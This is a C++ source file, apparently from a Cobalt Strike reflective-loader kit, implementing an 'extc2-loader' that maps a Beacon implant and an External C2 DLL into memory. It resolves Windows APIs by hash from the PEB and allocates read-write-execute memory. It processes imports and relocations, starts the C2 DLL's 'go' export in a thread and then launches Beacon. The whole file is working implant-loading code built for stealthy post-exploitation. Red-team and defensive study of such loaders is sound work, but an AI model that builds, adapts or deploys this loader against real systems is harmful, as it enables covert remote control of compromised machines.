//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "End.h"
#include "Utils.h"
#include "FunctionResolving.h"
#include "StdLib.h"
#include "BeaconUserData.h"
#include "TrackMemory.h"

/**
 * The position independent reflective loader
 *
 * @return The target DLL's entry point
*/
extern "C" {
#pragma code_seg(".text$a")
    ULONG_PTR __cdecl ReflectiveLoader() {
        // STEP 0: Determine the start address of the loader
#ifdef _WIN64
        // A rip relative address is calculated in x64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        /*
        * &ReflectiveLoader does not work on x86, since it does not support eip relative addressing
        * Therefore, it is calculated by substracting the function prologue from the current address
        * This is subject to change depending upon the compiler/compiler settings. This could result
        * in issues with Beacon/the postex DLL's cleanup routines. As a result, when writing x86 loaders
        * we strongly recommend verifying that the correct value is subtracted from the result of
        * GetLocation(). GetLocation() will return the address of the instruction following
        * the function call. In the example below, GetLocation() returns 0x00000014 which is why
        * we subtract 0x14 to get back to 0x0. In our testing, this value can change and can sometimes
        * cause crashes during cleanup.
        *
        * The generated disassembly from IDA:
        *
        * seg000:00000000                 push    ebp
        * seg000:00000001                 mov     ebp, esp
        * seg000:00000003                 and     esp, 0FFFFFFF8h
        * seg000:00000006                 sub     esp, 5DCh
        * seg000:0000000C                 push    ebx
        * seg000:0000000D                 push    esi
        * seg000:0000000E                 push    edi
        * seg000:0000000F                 call    GetLocation
        * seg000:00000014                 lea     ebx, [eax-0Eh]
        */
        void* loaderStart = (char*)GetLocation() - 0x14;
#endif
        PRINT("[+] Loader Base Address: %p\n", loaderStart);

        // STEP 1: Determine the base addresses of the two DLLs  
        ULONG_PTR rawBeaconDllBaseAddress = FindBufferBaseAddress();
        
        // Read the raw size of Beacon from the start of the payload file
        DWORD rawSizeOfBeacon = *(DWORD*)rawBeaconDllBaseAddress;
        
        // Locate the start of the Beacon DLL
        rawBeaconDllBaseAddress += sizeof(DWORD);
        PRINT("[+] Raw Beacon DLL Base Address: %p\n", rawBeaconDllBaseAddress);
        
        // Locate the start of the External C2 DLL
        ULONG_PTR rawExtC2DllBaseAddress = rawBeaconDllBaseAddress + rawSizeOfBeacon;
        PRINT("[*] Raw External C2 DLL Base Address: %p\n", rawExtC2DllBaseAddress);

        /*
        * STEP 2: Resolve the functions our loader needs...
        * 
        * Note: Cannot initialize the structure using '= { 0 }'
        * as the compiler may generate a memset function call.
        */ 
        _PPEB pebAddress = GetPEBAddress();
        EXTC2_LOADER_APIS winApi;
        _memset(&winApi, 0, sizeof(EXTC2_LOADER_APIS));
        if (!ExtC2LoaderResolveFunctions(pebAddress, &winApi)) {
            return NULL;
        }

        // STEP 3: Initialize Beacon User Data and allocated memory structures
        USER_DATA userData;
        _memset(&userData, 0, sizeof(userData));
        ALLOCATED_MEMORY allocatedMemory;
        _memset(&allocatedMemory, 0, sizeof(allocatedMemory));

        userData.allocatedMemory = &allocatedMemory;
        userData.version = COBALT_STRIKE_VERSION;

        /**
        * STEP 4: Load Beacon 
        * 
        * Note: To simplify the ExtC2LoaderLoadDll function we have created
        * the TARGET_DLL structure that provides all of the information we 
        * need to load the target DLL and track its memory.
        */ 
        TARGET_DLL beacon;
        _memset(&beacon, 0, sizeof(TARGET_DLL));
        beacon.Region = &userData.allocatedMemory->AllocatedMemoryRegions[0];
        beacon.Region->Purpose = PURPOSE_BEACON_MEMORY;
        beacon.RawBaseAddress = rawBeaconDllBaseAddress;
        beacon.Region->Type = MEM_PRIVATE;
        beacon.State = MEM_RESERVE | MEM_COMMIT;
        beacon.Protection = PAGE_EXECUTE_READWRITE;
        if (!ExtC2LoaderLoadDll(&beacon, &winApi.Base)) {
            return NULL;
        }

        // STEP 5: Load the External C2 DLL
        TARGET_DLL extC2;
        _memset(&extC2, 0, sizeof(TARGET_DLL));
        /**
        * This custom purpose can be checked in the Sleepmask to determine
        * whether the payload was loaded via the extc2-loader (aka beacon + extc2dll).
        * This is an example of using a custom ALLOCATED_MEMORY_PURPOSE value
        * to easily identify a custom memory allocation (any value above 1000 is 
        * intended for used-defined memory).
        */
        extC2.Region = &userData.allocatedMemory->AllocatedMemoryRegions[1];
        extC2.Region->Purpose = (ALLOCATED_MEMORY_PURPOSE)2000; 
        extC2.RawBaseAddress = rawExtC2DllBaseAddress;
        extC2.Region->Type = MEM_PRIVATE;
        extC2.State = MEM_RESERVE | MEM_COMMIT;
        extC2.Protection = PAGE_EXECUTE_READWRITE;
        if (!ExtC2LoaderLoadDll(&extC2, &winApi.Base)) {
            return NULL;
        }
        
        /**
        * STEP 6: Create event objects so the Sleepmask can synchronize the threads
        *
        * Note: We also save them to BUD's custom data field so we can easily
        * retrieve them via a call to BeaconGetCustomUserData() in the Sleepmask.
        */
        ((PEXTC2_SYNC_INFO)userData.custom)->ExtC2Init = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);
        if (((PEXTC2_SYNC_INFO)userData.custom)->ExtC2Init == NULL) {
            PRINT("[*] Failed to create event. Exiting...\n");
            return NULL;
        }
        ((PEXTC2_SYNC_INFO)userData.custom)->ExtC2StopEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);
        if (((PEXTC2_SYNC_INFO)userData.custom)->ExtC2StopEvent == NULL) {
            PRINT("[*] Failed to create event. Exiting...\n");
            return NULL;
        }
        ((PEXTC2_SYNC_INFO)userData.custom)->ExtC2SleepEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);
        if (((PEXTC2_SYNC_INFO)userData.custom)->ExtC2SleepEvent == NULL) {
            PRINT("[*] Failed to create event. Exiting...\n");
            return NULL;
        }
        ((PEXTC2_SYNC_INFO)userData.custom)->ExtC2ContinueEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);
        if (((PEXTC2_SYNC_INFO)userData.custom)->ExtC2ContinueEvent == NULL) {
            PRINT("[*] Failed to create event. Exiting...\n");
            return NULL;
        }
        PRINT("[*] Created event objects\n");
        
        /**
        * STEP 7: Run External C2
        * 
        * Note: Here we call the DLL's entry point to initialize the CRT and ensure
        * that its startup routines finish. We then resolve the exported go()
        * function and pass it a pointer to the ExtC2_INFO structure (saved in
        * the userData.custom field). We then have a small Sleep to ensure the
        * thread has started so that the event handles are copied before the
        * loader is cleaned.
        */
        PRINT("[*] Calling ExtC2's entry point (DLL_PROCESS_ATTACH).\n");
        ((DLLMAIN)extC2.EntryPoint)((HINSTANCE)NULL, DLL_PROCESS_ATTACH, NULL);

        PRINT("[*] Running ExtC2 in separate Thread.\n");
        constexpr DWORD GO_HASH = CompileTimeHash("go");
        ULONG_PTR extC2Go = GetExportedFunctionByHash((ULONG_PTR)extC2.Region->AllocationBase, GO_HASH);

        /**
        * STEP 8: Run External C2 in a separate thread and pass the event handles to it
        * 
        * Note: These handles are copied locally into the new thread's stack.
        */ 
        winApi.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)extC2Go, &userData.custom, 0, NULL);
        winApi.Sleep(1000);

        // STEP 9: Call Beacon's entry point
        PRINT("[*] Calling Beacon's entry point (DLL_BEACON_USER_DATA)\n");
        ((DLLMAIN)beacon.EntryPoint)(0, DLL_BEACON_USER_DATA, &userData);

        // STEP 10: Call Beacon's intialization routines
        PRINT("[*] Calling Beacon's entry point (DLL_PROCESS_ATTACH)\n");
        ((DLLMAIN)beacon.EntryPoint)((HINSTANCE)beacon.Region->AllocationBase, DLL_PROCESS_ATTACH, NULL);

        // STEP 11: Start Beacon
        PRINT("[*] Calling Beacon's entry point (BEACON_START)\n");
        ((DLLMAIN)beacon.EntryPoint)((HINSTANCE)loaderStart, 0x4, NULL);

        // STEP 12: Return our new entry point address so whatever called us can call DllMain() if needed.
        return beacon.EntryPoint;
    }
}

/*******************************************************************
 * To avoid problems with function positioning, do not add any new
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$b")

/**
 * Resolve the functions required by the extc2-loader
 *
 * Note: This is a wrapper around the library function ResolveBaseLoaderFunctions()
 *
 * @param pebAddress A pointer to the Process Environment Block (PEB)
 * @param winApi A pointer to a EXTC2_LOADER_APIS structure
 * @return A Boolean value to indicate success
*/
BOOL ExtC2LoaderResolveFunctions(_PPEB pebAddress, PEXTC2_LOADER_APIS winApi) {
    if (!ResolveBaseLoaderFunctions(pebAddress, &winApi->Base)) {
        return FALSE;
    }
    winApi->CreateEventA = (CREATEEVENTA)GetProcAddressByHash(pebAddress, KERNEL32DLL_HASH, CREATEEVENTA_HASH);
    if (winApi->CreateEventA == NULL) {
        PRINT("[-] Failed to find address of key loader function. Exiting..\n");
        return FALSE;
    }
    winApi->CreateThread = (CREATETHREAD)GetProcAddressByHash(pebAddress, KERNEL32DLL_HASH, CREATETHREAD_HASH);
    if (winApi->CreateThread == NULL) {
        PRINT("[-] Failed to find address of key loader function. Exiting..\n");
        return FALSE;
    }
    winApi->Sleep = (SLEEP)GetProcAddressByHash(pebAddress, KERNEL32DLL_HASH, SLEEP_HASH);
    if (winApi->Sleep == NULL) {
        PRINT("[-] Failed to find address of key loader function. Exiting..\n");
        return FALSE;
    }
    return TRUE;
}

/**
* A wrapper around the main loader logic
* 
* Note: This is not a library function, it is specific to the extc2-loader as it uses the TARGET_DLL structure
* 
* @param targetDll A pointer to a TARGET_DLL structure
* @param winApis A pointer to a WINDOWSAPIS structure
* @return A Boolean value to indicate success
*/
BOOL ExtC2LoaderLoadDll(PTARGET_DLL targetDll, PWINDOWSAPIS winApis) {
    // Find the PE header and size of the raw target DLL
    targetDll->PEHeader = (PIMAGE_NT_HEADERS)(targetDll->RawBaseAddress + ((PIMAGE_DOS_HEADER)targetDll->RawBaseAddress)->e_lfanew);
    targetDll->ImageSize = targetDll->PEHeader->OptionalHeader.SizeOfImage;

    // Create cleanup structure
    ALLOCATED_MEMORY_CLEANUP_INFORMATION cleanupMemoryInformation;
    _memset(&cleanupMemoryInformation, 0, sizeof(ALLOCATED_MEMORY_CLEANUP_INFORMATION));
    
    // Allocate memory for target DLL and populate cleanup structure
    targetDll->Region->AllocationBase = (PVOID)ExtC2LoaderAllocateMemory(targetDll, winApis, &cleanupMemoryInformation);
   
    // Track initial allocation for cleanup
    TrackAllocatedMemoryRegion(targetDll->Region, targetDll->Region->Purpose, (PVOID)targetDll->Region->AllocationBase, targetDll->ImageSize, targetDll->Region->Type, &cleanupMemoryInformation);

    // Copy the headers/sections and track them for the Sleepmask
    CopyDllAndTrackMemory(targetDll->Region, targetDll->RawBaseAddress, (ULONG_PTR)targetDll->Region->AllocationBase, COPY_PEHEADER::COPY_TRUE, targetDll->Protection, ALLOCATED_MEMORY_MASK_MEMORY_BOOL::MASK_TRUE);

    // Process the target DLL's import table...
    ResolveImports(targetDll->PEHeader, (ULONG_PTR)targetDll->Region->AllocationBase, winApis);

    // Process the target DLL's relocations...
    ProcessRelocations(targetDll->PEHeader, (ULONG_PTR)targetDll->Region->AllocationBase);

    // Find the DLl's entry point
    targetDll->EntryPoint = (ULONG_PTR)targetDll->Region->AllocationBase + targetDll->PEHeader->OptionalHeader.AddressOfEntryPoint;
        
    return TRUE;
}

/**
* Allocate memory for the loaded DLL image
*
* Note: This is not a library function, it is specific to the extc2-loader as it uses the TARGET_DLL structure
* 
* @param targetDll A pointer to a TARGET_DLL structure
* @param winApis A pointer to a WINDOWSAPIS structure
* @param cleanupMemoryInformation A pointer to an ALLOCATED_MEMORY_CLEANUP_INFORMATION structure
* @return A pointer to the allocated memory
*/
ULONG_PTR ExtC2LoaderAllocateMemory(PTARGET_DLL targetDll, PWINDOWSAPIS winApis, PALLOCATED_MEMORY_CLEANUP_INFORMATION cleanupMemoryInformation) {
    // Create a new location in memory for the loaded image...
    ULONG_PTR loadedDllBaseAddress = (ULONG_PTR)winApis->VirtualAlloc(NULL, targetDll->ImageSize, targetDll->State, targetDll->Protection);
    if (loadedDllBaseAddress == NULL) {
        PRINT("[-] Failed to allocate memory. Exiting..\n");
        return NULL;
    }
    else {
        PRINT("[+] Allocated memory: 0x%p\n", loadedDllBaseAddress);
    }

    // Set the relevant cleanup information
    cleanupMemoryInformation->AllocationMethod = ALLOCATED_MEMORY_ALLOCATION_METHOD::METHOD_VIRTUALALLOC;
    cleanupMemoryInformation->Cleanup = TRUE;

    return loadedDllBaseAddress;
}
